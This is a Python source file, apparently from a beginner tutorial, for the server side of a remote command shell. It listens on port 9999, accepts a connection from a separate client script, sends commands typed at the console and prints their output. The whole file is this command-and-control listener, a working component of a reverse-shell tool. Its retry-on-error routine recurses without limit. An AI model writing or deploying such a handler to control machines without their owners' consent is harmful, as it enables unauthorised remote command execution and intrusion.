import socket #importing the socket module 
import sys #importing the sys module 

host=None
port=None
sock=None

# creating a socket connection 
def socket_conn():
    try:
        global host
        global port
        global sock
        sock=socket.socket() #creating the global socket object
    except socket.error as msg:
        print("socket errors are", str(msg))

#binding and listening to the sockets    
def socket_bind_listen():
    global host
    global port 
    global sock
    try:
        host,port="",9999
        sock.bind((host,port))
        print("waiting for the connection on port 9999")
        sock.listen(5)
    except socket.error as msg:
        print("Socket got Error", str(msg) + "\n" + "retrying")
        socket_bind_listen() #calling the function again as recursuion until failed  

# accepting the socket connection and creating a connection object
def accept_connection():
    global sock
    conn,ip_addr=sock.accept()
    print(f"connecting to ip {ip_addr[0]} and port {ip_addr[1]}")
    send_commands(conn)#creating a function to send commands to the client.py file
    conn.close()#closing the connection
    
def send_commands(conn):
    global sock
    while True: #creating an infinfity loop
        cmd=input() #getting the input from the client
        if cmd.lower() == "quit":
            conn.close()#closing the connection
            sock.close()#closing the socket
            sys.exit() #closing the command prompt
        if len(str.encode(cmd)) > 1 : #if the command provided then 
            conn.send(str.encode(cmd)) #converting into bytes and send to the client computer
            conn_recv=str(conn.recv(1024) ,"utf-8") #receiving the command output in bytes and converting to utf-8 and then string 
            print(conn_recv)

#calling all the above function from main function 
def main():
    socket_conn() #calling the socket_connection
    socket_bind_listen() #calling the socket bind and listen function
    accept_connection() #calling the accept_connection which will call the send_commandfunction on the background


if __name__=="__main__":#if called directly 
    main() #calling the main function
    
    
             
    